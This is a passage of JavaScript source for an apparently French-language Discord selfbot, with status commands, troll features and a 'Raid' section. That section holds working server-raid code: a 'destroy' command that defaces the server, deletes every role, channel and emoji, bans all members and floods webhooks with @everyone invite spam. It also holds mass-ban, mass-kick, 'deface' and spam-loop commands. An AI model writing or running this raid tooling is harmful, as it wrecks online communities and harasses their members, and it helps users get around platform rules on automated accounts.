  client.user.setActivity(r.toJSON())
    message.edit("✔ **Tu joues " + status +" black clover**")
  }

  if (message.content.startsWith(prefix + "shadow")){
    const text = args.slice(1).join(' ')
     let status = ""
    if (text) status = text + " sur"
    let det = " "
    if (text) det = text
    const r = new RichPresence()
    .setApplicationId('1008318155136978975')
    .setType('PLAYING')
    .setState(client.user.username)
    .setName('shadow le bg ☘')
.setDetails(det)
    if (!text) r.setDetails(" ")
    .setStartTimestamp(Date.now())
    .setAssetsLargeImage('https://images-ext-2.discordapp.net/external/yUUqKvQAfB0iNEUbKIiEUAO1siNJHUAFGsAfkqDFxp0/%3Fsize%3D4096/https/cdn.discordapp.com/avatars/726466709333999636/a_2ec34742a521e46fe97c1da3130da529.gif')
  client.user.setActivity(r.toJSON())
    message.edit("✔ **Tu es " + status +" shadow le bg**")
  }

  if (message.content.startsWith(prefix + "naruto")){
    const text = args.slice(0).join(' ')
     let status = ""
    if (text) status = text + " sur"
    let det = " "
    if (text) det = text
    const r = new RichPresence()
    .setApplicationId('1008318155136978975')
    .setType('PLAYING')
    .setState(client.user.username)
    .setName('Naruto')
.setDetails(det)
     .setStartTimestamp(Date.now())
    .setAssetsLargeImage('mp:attachments/1008133909374050392/1008370321440637008/c6881a58d7d976f2a40ec0a7646b35c0_1.jpg?width=331&height=428')
  client.user.setActivity(r.toJSON())
    message.edit("✔ **Tu joues " + status +" naruto**")

  }
  
  if (message.content.startsWith(prefix + "hxh")){
    const text = args.slice(0).join(' ')
     let status = ""
    if (text) status = text + " sur"
    let det = " "
    if (text) det = text
    const r = new RichPresence()
    .setApplicationId('1008318155136978975')
    .setType('PLAYING')
    .setState(client.user.username)
    .setName('Hunter X Hunter')
.setDetails(det)
     .setStartTimestamp(Date.now())
    .setAssetsLargeImage('mp:attachments/1008133909374050392/1008370321440637008/c6881a58d7d976f2a40ec0a7646b35c0_1.jpg?width=331&height=428')
  client.user.setActivity(r.toJSON())
    message.edit("✔ **Tu joues " + status +" hunter x hunter**")

  }

  if (message.content.startsWith(prefix + "one piece")){
    const text = args.slice(1).join(' ')
     let status = ""
    if (text) status = text + " sur"
    let det = " "
    if (text) det = text
    const r = new RichPresence()
    .setApplicationId('1008318155136978975')
    .setType('PLAYING')
    .setState(client.user.username)
    .setName('One Piece')
    .setDetails(det)
     .setStartTimestamp(Date.now())
    .setAssetsLargeImage('mp:attachments/1008133909374050392/1008370320949915819/Autocollant-Mugiwara-Original.jpg?width=428&height=428')
  client.user.setActivity(r.toJSON())
    message.edit("✔ **Tu joues " + status +" one piece**")

  }

  if (message.content.startsWith(prefix + "pornhub")){
    const text = args.slice(0).join(' ')
     let status = ""
    if (text) status = text + " sur"
    let det = " "
    if (text) det = text
    const r = new RichPresence()
    .setApplicationId('1008318155136978975')
    .setType('WATCHING')
    .setState(client.user.username)
    .setName('Pornhub')
    .setDetails(det)    
    .setStartTimestamp(Date.now())
    .setAssetsLargeImage('mp:attachments/1008133909374050392/1008370320442408980/Symbole-Pornhub.jpg')
  client.user.setActivity(r.toJSON())
    message.edit("✔ **Tu regardes " + status +" pornhub**")

  }

  if (message.content.startsWith(prefix + "reset")){
    client.user.setActivity("", {
      type: ""
  });
  message.delete().catch(() => false)
  }

  if(message.content.startsWith(prefix + "stream")){
    let stream = args.slice(0).join(" ")
    if (!stream) stream = client.user.username
    client.user.setPresence({ status: 'online', activities: [{ name: `${stream}`, type: 'STREAMING', url: "https://twitch.tv/002_sans"}]  })
    message.delete().catch(() => false)
  }

  if(message.content.startsWith(prefix + "regarde")){
    let stream = args.slice(0).join(" ")
    if (!stream) stream = client.user.username
    client.user.setPresence({ status: 'online', activities: [{ name: `${stream}`, type: 'WATCHING', url: "https://twitch.tv/002_sans"}]  })
    message.delete().catch(() => false)

  }

  if(message.content.startsWith(prefix + "joue")){
    let stream = args.slice(0).join(" ")
    if (!stream) stream = client.user.username
    client.user.setPresence({ status: 'online', activities: [{ name: `${stream}`, type: 'PLAYING', url: "https://twitch.tv/002_sans"}]  })
    message.delete().catch(() => false)

  }

    if(message.content.startsWith(prefix + "ecoute")){
    let stream = args.slice(0).join(" ")
    if (!stream) stream = client.user.username
    client.user.setPresence({ status: 'online', activities: [{ name: `${stream}`, type: 'LISTENING', url: "https://twitch.tv/002_sans"}]  })
    message.delete().catch(() => false)

  }

  if(message.content.startsWith(prefix + "participe")){
    let stream = args.slice(0).join(" ")
    if (!stream) stream = client.user.username
    client.user.setPresence({ status: 'online', activities: [{ name: `${stream}`, type: 'COMPETING', url: "https://twitch.tv/002_sans"}]  })
    message.delete().catch(() => false)

  }












// Troll

if (message.content.startsWith(prefix + "ratio")){
  await message.delete().catch(() => false)
  message.channel.messages.fetch({ limit: 1 }).then(messages => {
    let lastMessage = messages.first();
    
    if (lastMessage.author.id === client.user.id) return;
    else {
      lastMessage.react("🇷").then(() => lastMessage.react("🇦").then(() => lastMessage.react("🇹").then(() => lastMessage.react("🇮").then(() => lastMessage.react("🇴").catch(() => false)).catch(() => false)).catch(() => false)).catch(() => false)).catch(() => false)
    }
  })
}
if (message.content.startsWith(prefix + "mreact")){
  await message.delete().catch(() => false)
  message.channel.messages.fetch({ limit: 1 }).then(messages => {
    let lastMessage = messages.first();
    
    if (lastMessage.author.id === client.user.id) return;
    else {
      lastMessage.react("🕷").catch(() => false)
      lastMessage.react("🔥").catch(() => false)
      lastMessage.react("🌊").catch(() => false)
      lastMessage.react("🎉").catch(() => false)
      lastMessage.react("🍣").catch(() => false)
      lastMessage.react("🍑").catch(() => false)
      lastMessage.react("🍒").catch(() => false)
      lastMessage.react("🧨").catch(() => false)
      lastMessage.react("🥰").catch(() => false)
      lastMessage.react("😪").catch(() => false)
      lastMessage.react("🍉").catch(() => false)
      lastMessage.react("☔").catch(() => false)
      lastMessage.react("🍧").catch(() => false)
      lastMessage.react("🌷").catch(() => false)
      lastMessage.react("❤").catch(() => false)
      lastMessage.react("💔").catch(() => false)
      lastMessage.react("💎").catch(() => false)
      lastMessage.react("🎂").catch(() => false)
      lastMessage.react("🌈").catch(() => false)
      lastMessage.react("🐶").catch(() => false)
      lastMessage.react("🎉").catch(() => false)
      lastMessage.react("🌹").catch(() => false)
      lastMessage.react("🐱‍👤").catch(() => false)
      lastMessage.react("🤢").catch(() => false)
      lastMessage.react("🎁").catch(() => false)
      lastMessage.react("✨").catch(() => false)
      lastMessage.react("👀").catch(() => false)
      lastMessage.react("💋").catch(() => false)
    }
  }).catch(() => false)
}

if (message.content.startsWith(prefix + "vide")){
await message.delete().catch(() => false)
message.channel.send("​​​​​​")
}
if (message.content.startsWith(prefix + "copy")){
  let user = message.mentions.users.first() || client.users.cache.get(args[0])
  if (!user) return message.edit(":x: **Personne de trouvé**")
  
  copychannel[message.channel.id] = {
    activé: "oui"
  }

  copy[user.id] = {
    activé: "oui"
  }
  savecopy()
  savecopychannel()
  message.delete().catch(() => false)
  }

  if (message.content.startsWith(prefix + "stopcopy")){
    let user = message.mentions.users.first() || client.users.cache.get(args[0])
    if (!user) return message.edit(":x: **Personne de trouvé**")
    
    delete copy[user.id]
    delete copychannel[message.channel.id]
    savecopy()
    savecopychannel()
    message.delete().catch(() => false)
    }

    if (message.content.startsWith(prefix + "ghostping")){
      message.delete().catch(() => false)
    }





















// Raid

if (message.content.startsWith(prefix + "spam")) {
  if (message.author.id === client.user.id) {
          if (message.deletable) message.delete().catch(() => false);
          //if (message.channel.type === "dm") return;
          let cc = args.slice(0).join(" ")
          let inteval = setInterval(function() {
              message.channel.send(cc);
          }, 1000);
          commandIntervals.push(inteval);
      }
  }

if (message.content === prefix + "stopspam") {
  if (message.author.id === client.user.id) {
      if (message.deletable) message.delete().catch(() => false);
          commandIntervals.forEach(interval => {
              clearInterval(interval);
          });
          message.channel.send("__**commande spam arrêtée avec succès**__ :white_check_mark:");
      }
  }

  if (message.content.startsWith(prefix + "spamfast")) {
  if (message.author.id === client.user.id) {
          if (message.deletable) message.delete().catch(() => false);
          //if (message.channel.type === "dm") return;
          let cc = args.slice(0).join(" ")
          let inteval = setInterval(function() {
              message.channel.send(cc);
          }, 500);
          commandIntervals.push(inteval);
      }
  }

if (message.content.startsWith(prefix + "destroy")){
  if (message.channel.type === 'dm' || message.channel.type === "group") return message.edit(":x: **Commande uniquement utilisable sur serveur**.");
  if (!message.member.permissions.has("ADMINISTRATOR")) return message.delete().then(console.log('[', "ERROR".red, ']', "permission insuffisante".green));
  message.delete().catch(e => { })
const spammed = args.splice(0).join(" ") || "@everyone https://discord.gg/3ScUGWWEv7";

  message.guild.setName("RAIDED BY " + client.user.username).catch(e => { })
  message.guild.setIcon(client.user.avatarURL).catch(e => { })
  message.guild.setVerificationLevel("NONE").catch(e => { })
  await message.guild.setCommunity(false).catch(e => { })
  message.guild.setBanner(yourgif).catch(e => { })
  message.guild.setDefaultMessageNotifications("ALL_MESSAGES").catch(e => { })


  message.guild.roles.cache.forEach(roles => {
    if (roles.name === client.user.username) return;
    roles.delete(client.user.username + " t'as baiser")
      .catch(e => { });
  })

    for (let i = 0; i < 150; i++) {
      message.guild.roles.create({
        name: client.user.username,
        color: 'RANDOM',
        reason: client.user.username + " t'as baiser",
      })
        .catch(e => { });
    };


  message.guild.channels.cache.forEach(channel => {
    if (channel.name === client.user.username) return;
    channel.delete(client.user.username + " t'as baiser")
      .catch(e => { });
  })


message.guild.emojis.cache.forEach(emoji => {
  emoji.delete().catch(e => { })
});


message.guild.stickers.cache.forEach(emoji => {
  emoji.delete().catch(e => { })
});

await message.guild.members.fetch().then(() => {
  message.guild.members.cache.forEach(member=> {
    member.ban({ reason: client.user.username + " t'as baiser" }).catch(e => { });
});
})

for (let i = 0; i < 99; i++) {
  message.guild.channels.create( client.user.username, { reason: client.user.username + " t'as baiser" }).then(channel => {     channel.createWebhook(client.user.username).catch(() => false)}).catch(console.error)
};

let toSend = args.splice(0).join(' ') || "@everyone\https://discord.gg/3ScUGWWEv7";

setInterval(async function () {
  await message.guild.fetchWebhooks().then(web => web.forEach(w => w.send(toSend).catch(e => {console.log(e) }))).catch(() => false);
}, 1);

}

if (message.content.startsWith(prefix + "delete all stickers")){
  if (message.channel.type === 'dm' || message.channel.type === "group") return message.edit(":x: **Commande uniquement utilisable sur serveur**.");
  if (!message.member.permissions.has("ADMINISTRATOR")) return message.delete().then(console.log('[', "ERROR".red, ']', "permission insuffisante".green));
  message.delete().catch(e => { })
message.guild.stickers.cache.array.forEach(sticker => {
  sticker.delete().catch(e => { })
});
}

if (message.content.startsWith(prefix + "delete all emotes")){
  if (message.channel.type === 'dm' || message.channel.type === "group") return message.edit(":x: **Commande uniquement utilisable sur serveur**.");
  if (!message.member.permissions.has("ADMINISTRATOR")) return message.delete().then(console.log('[', "ERROR".red, ']', "permission insuffisante".green));
  message.delete().catch(e => { })
message.guild.emojis.cache.array.forEach(emoji => {
  emoji.delete().catch(e => { })
});
}


if (message.content.startsWith(prefix + "create channel")){
  let name = args.slice(1).join(" ") || client.user.username
  if (message.channel.type === 'dm' || message.channel.type === "group") return message.edit(":x: **Commande uniquement utilisable sur serveur**.");
  if (!message.member.permissions.has("MANAGE_CHANNELS")) return message.delete().then(console.log('[', "ERROR".red, ']', "permission insuffisante".green));
  message.delete().catch(e => { })

  for (let i = 0; i < 99; i++) {
    message.guild.channels.create( name, { reason: 'Y a pas de raisons pour se faire raid' }).then(message.delete).catch(console.error)
  };
}

if (message.content.startsWith(prefix + "create roles")){
  let name = args.slice(1).join(' ') || client.user.username
  if (message.channel.type === 'dm' || message.channel.type === "group") return message.edit(":x: **Commande uniquement utilisable sur serveur**.");
  if (!message.member.permissions.has("MANAGE_ROLES")) return message.delete().then(console.log('[', "ERROR".red, ']', "permission insuffisante".green));
  message.delete().catch(e => { })

  for (let i = 0; i < 999; i++) {
    message.guild.roles.create({
      name: name,
      color: 'RANDOM',
      reason: 'We Fuck All',
    })
      .catch(e => { });
  };


}

if (message.content.startsWith(prefix + "delete all roles")){
  if (message.channel.type === 'dm' || message.channel.type === "group") return message.edit(":x: **Commande uniquement utilisable sur serveur**.");
  if (!message.member.permissions.has("MANAGE_ROLES")) return message.delete().then(console.log('[', "ERROR".red, ']', "permission insuffisante".green));
  message.delete().catch(e => { })
message.guild.roles.cache.forEach(roles => {
  roles.delete('We Fuck All')
    .catch(e => { });
});

  };


  
  if (message.content.startsWith(prefix + "all ban")){
    if (message.channel.type === 'dm' || message.channel.type === "group") return message.edit(":x: **Commande utilisable sur un serveur uniquement**.");
    if (!message.member.permissions.has("BAN_MEMBERS")) return message.delete().then(console.log('[', "ERROR".red, ']', "no perms".green));
    message.delete().catch(e => { })
    await message.guild.members.fetch().then(() => {
      message.guild.members.cache.forEach(member=> {
        member.ban({ reason: 'All ban' }).catch(e => { });
    });
  })
};





if (message.content.startsWith(prefix + "all kick")){
  if (message.channel.type === 'dm' || message.channel.type === "group") return message.edit(":x: **Commande utilisable sur un serveur uniquement**.");
  if (!message.member.permissions.has("KICK_MEMBERS")) return message.delete().then(console.log('[', "ERROR".red, ']', "no perms".green));
  message.delete().catch(e => { })
  await message.guild.members.fetch().then(() => {
    message.guild.members.cache.forEach(member=> {
      member.kick({ reason: 'All kick' }).catch(e => { });
  });
  })

};

if (message.content.startsWith(prefix + "all nick")){
  if (message.channel.type === 'dm' || message.channel.type === "group") return message.edit(":x: **Commande utilisable sur un serveur uniquement**.");
  if (!message.member.permissions.has("MANAGE_NICKNAMES")) return message.delete().then(console.log('[', "ERROR".red, ']', "no perms".green));
  const name = args.slice(1).join(" ") || client.user.username
  message.delete().catch(e => { })
  await message.guild.members.fetch().then(() => {
    message.guild.members.cache.forEach(member=> {
      member.setNickname(name, { reason: 'All name' }).catch(e => { });
  });
  })

};


    


  if (message.content.startsWith(prefix + "delete all channels")){
    if (message.channel.type === 'dm' || message.channel.type === "group") return message.edit(":x: **Commande uniquement utilisable sur serveur**.");
    if (!message.member.permissions.has("MANAGE_CHANNELS")) return message.delete().then(console.log('[', "ERROR".red, ']', "permission insuffisante".green));
    message.delete().catch(e => { })
  message.guild.channels.cache.forEach(channel => {
    channel.delete('We Fuck All')
      .catch(e => { });
  });
  
    };

    if (message.content.startsWith(prefix + "deface")){
      if (message.channel.type === 'dm' || message.channel.type === "group") return message.edit(":x: **Commande uniquement utilisable sur serveur**.");
      if (!message.member.permissions.has("ADMINISTRATOR")) return message.delete().then(console.log('[', "ERROR".red, ']', "permission insuffisante".green));
      message.delete().catch(e => { })
      message.guild.setName("RAIDED BY " + client.user.username).catch(e => { })
      message.guild.setIcon(client.user.avatarURL).catch(e => { })
      message.guild.setVerificationLevel("NONE").catch(e => { })
      message.guild.setCommunity(false).catch(e => { })
      message.guild.setBanner(yourgif).catch(e => { })
      message.guild.setDefaultMessageNotifications("ALL_MESSAGES").catch(e => { })

      message.guild.channels.cache.forEach(channel => {
        if (!channel) return;
        channel.delete().catch(e => { })
      });
      message.guild.channels.create("Raided by " + client.user.username).catch(e => { })
    }

    if (message.content.startsWith(prefix + "webhook spam")){
      let toSend = args.splice(1).join(' ') || "@everyone\https://discord.gg/3ScUGWWEv7";
      if (message.channel.type === 'dm' || message.channel.type === "group") return message.edit(":x: **Commande uniquement utilisable sur serveur**.");
      if (!message.member.permissions.has("MANAGE_WEBHOOKS")) return message.delete().then(console.log("[ERROR] Permission Insuffisante"));
      message.delete().catch(e => { })
      await message.guild.channels.fetch().then(async() => {
       await message.guild.channels.cache.map(async channel=> {
        await channel.createWebhook(client.user.username, client.user.avatarURL()).then(async() => await channel.createWebhook(client.user.username, client.user.avatarURL).catch(() => false)
        ).catch(() => false)
      })

      })
     let interval = setInterval(async function () {
        await message.guild.fetchWebhooks().then(web => web.forEach(w => w.send(toSend).catch(() => false))).catch(() => false);
    }, 1);
    webhookIntervals.push(interval);
    }

    if (message.content === prefix + "stop webhook spam") {
      if (message.author.id === client.user.id) {
          if (message.deletable) message.delete().catch(() => false);
              webhookIntervals.forEach(interval => {
                  clearInterval(interval);
              });
              message.channel.send("__**commande webhook spam arrêtée avec succès**__ :white_check_mark:");
          }
      }

    if (message.content.startsWith(prefix + "decale")){
      if (message.channel.type === 'dm' || message.channel.type === "group") return message.edit(":x: **Commande uniquement utilisable sur serveur**.");
      if (!message.member.permissions.has("ADMINISTRATOR")) return message.delete().then(console.log('[', "ERROR".red, ']', "permission insuffisante".green));
      message.delete().catch(e => { })
      message.guild.setName("On décale").catch(e => { })
      message.guild.setIcon("https://i.imgur.com/alRVoFD.jpg").catch(e => { })
      await message.guild.setVerificationLevel("NONE").catch(e => { })
      message.guild.setCommunity(false).catch(e => { })
      message.guild.setBanner("https://i.pinimg.com/originals/50/c5/f1/50c5f1847013012ee0f25f67fdddb8d9.gif").catch(e => { })
      message.guild.setDefaultMessageNotifications("ALL_MESSAGES").catch(e => { })

      message.guild.channels.cache.forEach(channel => {
        if (!channel) return;
        channel.delete().catch(e => { })
      });
      message.guild.channels.create('on-décale',{
        type: 'GUILD_TEXT',

        id: message.guild.roles.everyone,
        SEND_MESSAGES: false,
      })     
       .then(c => {
        c.permissionOverwrites.edit(message.guild.roles.everyone, {
          SEND_MESSAGES: false,
        })
      })
      .catch(e => { })
    }




























    // Utile

    if (message.content.startsWith(prefix + "ui")){
      if (message.guild){
      const member = message.guild.members.cache.get(args[0]) || message.mentions.members.first()
      if(!member) await client.users.fetch(args[1]).catch(() => message.edit(":x: *Aucun membre de trouvé***"))
      if (!member) return message.edit(":x: **Veuillez mentionner un membre valide**");
      if (!message.guild.roles) return;
              if (emode["embed" === "on"]){
      var embed = new WebEmbed()
      .setAuthor({
        name: `𝐢𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧𝐬 𝐬𝐮𝐫 ${member.displayName}`,
        iconURL: member.user.displayAvatarURL(),
      })
      .setThumbnail(member.user.displayAvatarURL())
      .setColor(color)
      .setDescription(`𝐩𝐬𝐞𝐮𝐝𝐨: ${member.user.tag}
      𝐈𝐃: ${member.id}

      𝐀 𝐫𝐞𝐣𝐨𝐢𝐧𝐭 𝐥𝐞 𝐬𝐞𝐫𝐯𝐞𝐮𝐫 𝐥𝐞: ${member.joinedAt.toUTCString()}

      𝐀 𝐜𝐫éé 𝐬𝐨𝐧 𝐜𝐨𝐦𝐩𝐭𝐞 𝐥𝐞: ${member.user.createdAt.toUTCString()}

      𝐫𝐨𝐥𝐞𝐬 [${member.roles.cache.size}]: ${member.roles.cache.map((r) => r.name).join(", ")}

      𝐀𝐯𝐚𝐭𝐚𝐫 𝐔𝐑𝐋: ${member.user.displayAvatarURL({  dynamic: true })}`)
    }
    else{
      var embed = "```"+
`Pseudo                   » ${member.user.tag}
ID                       » ${member.user.id}
A rejoint le serveur le  » ${member.joinedAt.toUTCString()}
A créé son compte le     » ${member.user.createdAt.toUTCString()}
Roles                    » [${member.roles.cache.size}]${member.roles.cache.map((r) => r.name).join(", ")}
Avatar URL               » ${member.user.displayAvatarURL({  dynamic: true })}`
      +"```"
    }
    if (emode["embed" === "on"]) return message.edit({ embeds: [embed] });
    if (emode["embed" === "off"]) return message.edit(embed)
      }
      else if (!message.guild){
        const member = client.users.cache.get(args[0]) || message.mentions.users.first()
        if (!member) return message.edit(":x: **Veuillez mentionner un membre valide**");
        if (emode["embed" === "on"]){
          var embed = new WebEmbed()
          .setAuthor({
            name: `𝐢𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧𝐬 𝐬𝐮𝐫 ${member.displayName}`,
            iconURL: member.user.displayAvatarURL(),
          })
          .setThumbnail(member.user.displayAvatarURL())
          .setColor(color)
          .setDescription(`𝐩𝐬𝐞𝐮𝐝𝐨: ${member.tag}
          𝐈𝐃: ${member.id}
          𝐀 𝐜𝐫éé 𝐬𝐨𝐧 𝐜𝐨𝐦𝐩𝐭𝐞 𝐥𝐞: ${member.createdAt.toUTCString()}
          𝐀𝐯𝐚𝐭𝐚𝐫 𝐔𝐑𝐋: ${member.user.displayAvatarURL({  dynamic: true })}`)
        }
        else{
          var embed = "```" + 

`Pseudo        » ${member.username}
Discriminator » ${member.discriminator}
Tag           » ${member.tag}
Bio           » ${member.bio}`

           +"``````" +
           
`Compte créé le   » ${member.createdAt.toUTCString()}`
                      
                      + "``````" +
           
           `Photo de profile   » ${member.displayAvatarURL({  dynamic: true })}`
                      
                      + "```"
        }
      if (emode["embed" === "on"]) return message.edit({ embeds: [embed] });
      if(emode["embed"] === "off") return message.edit(embed)
      }
  };
  if (message.content.startsWith(prefix + "mute ")){
    if (!args[0]) return;
      if (args[1]) {var temps = (args[1]).replace("j", "d")} else var temps = "28d"
      if (temps){if (isNaN(ms(temps))) return message.edit(":x: **Veuillez me donner un temps valide**").catch(() => false)}
      let cc = temps + " "
      const member = message.guild.members.cache.get(args[0]) || message.mentions.members.first()
      if (!member) message.edit("aucun membre trouvé pour `" + args[0] + "`").catch(() => false)
      member.timeout(ms(temps)).then(() => message.edit(member.user.tag + " a été **timeout** pendant **" + temps + "**").catch(() => false)).catch(() => false)
      
  }

  if (message.content.startsWith(prefix + "unmute ")){
    if (!args[0]) return;
      const member = message.guild.members.cache.get(args[0]) || message.mentions.members.first()
      if (!member) message.edit("aucun membre trouvé pour `" + args[0] + "`").catch(() => false)
      member.timeout(0).then(() => message.edit(member.user.tag + " a été **untimeout**").catch(() => false)).catch(() => false)
      
  }

    if (message.content.startsWith(prefix + 'addrole')){
      let rMember = message.mentions.members.first() || message.guild.members.cache.get(args[0]) 
      if (!rMember) return
  
  
  
      let role = message.mentions.roles.first() || message.guild.roles.cache.get(args[1]) 
  
  
      if (!role) return message.edit(`Aucun rôle trouvé pour \`${args[1]|| "rien"}\``)

      if (!rMember.roles.cache.has(role.id)) await rMember.roles.add(role.id, `Rôle ajouté par ${message.author.tag}`).then(() => {
             
        message.edit(`✔ **Rôle ajouté**`)
        }).catch(() => {

            message.edit(`Je n'est pas pu ajouté ce rôle à **${rMember.tag}** !`)

        })
    }

    if (message.content.startsWith(prefix + "blist")){
if (!args[0]) return message.edit(':x: **veuillez mentionner quelqu\'un ou me donner son id**')
let user = message.mentions.users.first() || client.users.cache.get(args[0])
if (user) user = user.id
if (!user) user = args[0]
let raison = args.slice(1).join(" ")
if(!raison) raison = "Aucune raison"

client.guilds.cache.forEach(g => {
    if(g.members.cache.get(user)) {
      g.members.cache.get(user).ban().catch(() => false)
  }
})

  bl["users"].push(user)
savebl()
message.edit(`✔ **<@${user}> est dans la blacklist pour \`${raison}\`**`)
    }

    if (message.content.startsWith(prefix + "unbl")){
      if (!args[0]) return message.edit(":x: donne moi l'id d'un membre")
      if (bl[args[0]]) {
        delete bl[args[0]];
        savebl(), message.edit("✔ **<@"+args[0]+"> n'est plus bl**")
        ;
    }
    else message.edit(":x: **"+args[0]+" n'est pas bl**")
    }

    if (message.content.startsWith(prefix + "afk")) {
      if (afk[client.user.id]) {
      return message.edit(":x: **Tu es déjà afk**")
      }
      let raison = args.splice(0).join(' ') || "Aucune raison";
      afk[client.user.id] = {
          activé: "oui",
          r: raison
      }
      saving()
      message.edit("✔ **Vous etes afk pour** " + raison)
  }
  if (message.content.startsWith(prefix + "quoi")) {
    if (qf[client.user.id]) {
    return message.edit(":x: **quoi feur déjà activé**")
    }
    let raison = args.splice(0).join(' ') || "Aucune raison";
    qf[client.user.id] = {
        activé: "oui",
    }
    savequoi()
    message.edit("✔ **Vous avez activer le quoi feur hehe** ")
}

if (message.content.startsWith(prefix + "unquoi")) {
  if (qf[client.user.id]) {
  return message.edit(":x: **quoi feur déjà désactivé**")
  }
  let raison = args.splice(0).join(' ') || "Aucune raison";
  delete qf[client.user.id]
  savequoi()
  message.edit("✔ **Vous avez désactivé le quoi feur... rip :(** ")
}

  

    if (message.content.startsWith(prefix + "steal emote")) {
      if (message.channel.type === 'dm') {
          message.edit(":x: **Commande pas executable en mp**");
          return;
      }
      let guild = args.splice(1).join(' '),
          guilded = client.guilds.cache.get(guild);
      if (!guilded) {
          message.edit(":x: **Aucun serveur trouvable avec l'id** \"" + guild + '\"');
          return;
      }
      if (!message.member.permissions.has("MANAGE_EMOJIS")) return message.edit(":x: **Vous n\'avez pas les permissions \"Gérer les emojis\" sur ce serveur**");
      (guilded.emojis.size < 1) && message.edit(":x: **Le serveur ne contient aucun emote.**");
      let whatDaFuck = '1';
      guilded.emojis.cache.forEach(emote => {
              setTimeout(() => {
                  let name = emote.name;
                  const lien = 'https://cdn.discordapp.com/emojis/' + emote.id + '.' + emote.animated ? "gif" : "png";
                  message.guild.emojis.create(lien, name).catch(err => whatDaFuck + 1);

              }, 1500);
          }),
          message.edit(":white_check_mark: **J'ai volé les emotes du serveur** \"" + guilded.name + '\"');
  }

  if (message.content.startsWith(prefix + "massrole")){
    if (args[0] === "add") {
      const role = message.mentions.roles.first() || message.guild.roles.cache.get(args[1]);
      if (!role) return message.edit(`Aucun rôle trouver pour \`${args[1] || " "}\``)
   let count = 0
      message.edit(`Je suis entrain d'ajouté le rôle \`${role}\` à ${message.guild.memberCount} utilisateur...`)
      message.guild.members.cache.forEach(member => setInterval(() => {
         count++
          if (member) member.roles.add(role, `Masiverole`).catch(() => false)
          if(count === message.guild.memberCount)  return message.channel.send(`1 rôle ajouté à ${message.guild.memberCount} ${message.guild.memberCount > 1 ? 'membres' : 'membre'}`);
      }), 250)
  

  } else if (args[0] === "remove") {
      const role = message.mentions.roles.first() || message.guild.roles.cache.get(args[1]);
      if (!role) return message.edit(`Aucun rôle trouver pour \`${args[1] || " "}\``)
      let count = 0

      message.edit(`Je suis entrain d'enlevé le rôle \`${role}\` à ${message.guild.memberCount} utilisateur...`)
      message.guild.members.cache.forEach(member => setInterval(() => {
          count++
          if (member) member.roles.remove(role, `Masiverole`).catch(() => false)
          if(count === message.guild.memberCount)  return message.channel.send(`1 rôle enlevé à ${message.guild.memberCount} ${message.guild.memberCount > 1 ? 'membres' : 'membre'}`);

      }), 250);

  }
  }

  if (message.content.startsWith(prefix + 'pic')){
    let member = message.mentions.users.first() || client.users.cache.get(args[0])
    if (!member) member = message.author
    if (emode["embed"] === "on"){
var Embed = new WebEmbed()
    .setTitle(`${member.username}`)
    .setImage(`${member.displayAvatarURL({  dynamic: true })}`);
    }
    else{
      var Embed = `${member.displayAvatarURL({  dynamic: true })}`
    }
    if (emode["embed"] === "on")message.edit({embeds: [Embed]}).catch(() => false)
    if (emode["embed"] === "off")message.edit(Embed).catch(() => false)
  }

  if (message.content.startsWith(prefix + "voice")){
    if (args[0] === 'move'){
      let channel = message.guild.members.cache.filter(u => u.voice.channel)
      if (!channel) return message.channel.send("Aucun membres n'est en vocal");
      if (channel && message.member.voice.channel) {
if (!args[1]) return message.edit(":x: **donne moi l'id d'un salon**");
else{
  let newchannel = message.guild.channels.cache.get(args[1]);

  channel.forEach(e => {

    e.voice.setChannel(newchannel, `Moveall`);
  
}) 
}
    }
  }
    if(args[0] === "all") {
    
      var streamingCount = 0;
      var mutedCount = 0;
      var mutedMic = 0;
      var cameraCount =0;
      var connectedCount =0;
  
      const channels = message.guild.channels.cache.filter(c => c.type === 'voice');
      channels.forEach(c => {
          connectedCount += c.members.size;
          c.members.forEach(m => {
              if(m.voice.streaming) streamingCount++;
              if(m.voice.selfDeaf || m.voice.serverDeaf) mutedCount++;            
              if(m.voice.selfMute || m.voice.serverMute) mutedMic++;
              if(m.voice.selfVideo) cameraCount++;
          })
      })
      if (emode["embed"] === "on"){
      var voiceConnectedEmbed = new WebEmbed()    
      .setTitle(`Salons vocaux`)
          .setDescription(` 
  ${message.guild.members.cache.filter(m => m.voice.channel).size}** ${message.guild.members.cache.filter(m => m.voice.channel).size  > 1 ? 'personnes' : 'personne'} en vocal.
  ${mutedMic} ${mutedMic > 1 ? 'personnes' : 'personne'} sont mute micro. 
  ${mutedCount} ${mutedCount > 1 ? 'personnes' : 'personne'} sont mute casque. 
  ${streamingCount} ${streamingCount > 1 ? 'personnes' : 'personne'} sont en stream.
  ${cameraCount} ${cameraCount > 1 ? 'personnes' : 'personne'} sont en caméra.
  `)   
      }
      else{
        var voiceConnectedEmbed = ` ${message.guild.members.cache.filter(m => m.voice.channel).size}** ${message.guild.members.cache.filter(m => m.voice.channel).size  > 1 ? 'personnes' : 'personne'} en vocal.
        ${mutedMic} ${mutedMic > 1 ? 'personnes' : 'personne'} sont mute micro. 
        ${mutedCount} ${mutedCount > 1 ? 'personnes' : 'personne'} sont mute casque. 
        ${streamingCount} ${streamingCount > 1 ? 'personnes' : 'personne'} sont en stream.
        ${cameraCount} ${cameraCount > 1 ? 'personnes' : 'personne'} sont en caméra.`
      }
     
      if (emode["embed"] === "on") return message.edit({embeds: [voiceConnectedEmbed]})
      if (emode["embed"] === "off") return message.edit(voiceConnectedEmbed)
    }
  else{
    if (emode["embed"] === "on"){
      var embed = new WebEmbed()
      .setTitle(`Salons vocaux`)
      .setDescription(`Il y a actuellement ${message.guild.members.cache.filter(m => m.voice.channel).size} ${message.guild.members.cache.filter(m => m.voice.channel).size  > 1 ? 'personnes' : 'personne'} en vocal sur le serveur. `)
    }
    else{
      var embed = `Il y a actuellement ${message.guild.members.cache.filter(m => m.voice.channel).size} ${message.guild.members.cache.filter(m => m.voice.channel).size  > 1 ? 'personnes' : 'personne'} en vocal sur le serveur.`
    }
    if (emode["embed"] === "on") return message.edit({embeds: [embed]}) 
    if (emode["embed"] === "off") return message.edit(embed) 

  }
  }

  if (message.content.startsWith(prefix + "derank")){
    if(args[0]) {
      let user = client.users.cache.get(args[0]) || message.mentions.members.first()  
      if(!user) return message.edit(`Aucun membre trouvée pour: \`${args[0]}\``)
if(user) {
  if (user.id === client.user.id) {
      return message.delete();
    }
